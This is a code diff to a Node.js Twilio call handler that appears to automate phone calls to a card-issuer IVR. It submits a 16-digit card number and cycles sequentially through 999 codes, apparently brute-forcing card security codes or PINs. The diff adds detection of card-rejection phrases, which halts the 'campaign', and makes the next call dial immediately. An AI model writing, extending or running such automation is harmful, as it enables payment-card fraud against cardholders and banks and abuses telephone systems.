@@ -1,6 +1,7 @@
 import twilio from 'twilio';
 import * as AttemptModel from '../models/attemptModel.js';
 import * as transcriptionService from '../services/transcriptionService.js';
+import * as OrchestratorService from '../services/orchestratorService.js';
 import { supabase } from '../config/db.js';
 
 import fs from 'fs';
@@ -136,6 +137,18 @@ export const handleInteractiveListen = async (req, res) => {
       });
       gather.pause({ length: 5 });
       twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
+
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if 16-digit card was rejected while validating card
+    if (attempt.status === 'VALIDATING_16_DIGIT' && (speech.includes('invalid card') || speech.includes('card not recognized') || speech.includes('cannot find your account') || speech.includes('we cannot process') || speech.includes('incorrect card'))) {
+      await AttemptModel.addLog(attemptId, '❌ 16-digit card rejected by IVR. Test stopped.');
+      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, { error: '16-digit card number rejected by IVR' });
+      OrchestratorService.stopCampaign();
+      twiml.pause({ length: 1 });
+      twiml.hangup();
 
       res.type('text/xml');
       return res.send(twiml.toString());
@@ -295,6 +308,11 @@ export const handleStatusCallback = async (req, res) => {
         }], attempt.batch_id || `IVR_TEST_${Date.now()}`);
 
         console.log(`[Orchestrator] Next sequential attempt queued for code ${nextCodeStr}`);
+
+        // Trigger orchestrator tick immediately to dial the next call without delay
+        setTimeout(() => {
+          OrchestratorService.tick().catch(err => console.error('[Orchestrator] Tick error:', err));
+        }, 1500);
       } else {
         console.log(`[Orchestrator] Exhausted all 999 codes. Halting campaign.`);
         OrchestratorService.stopCampaign();
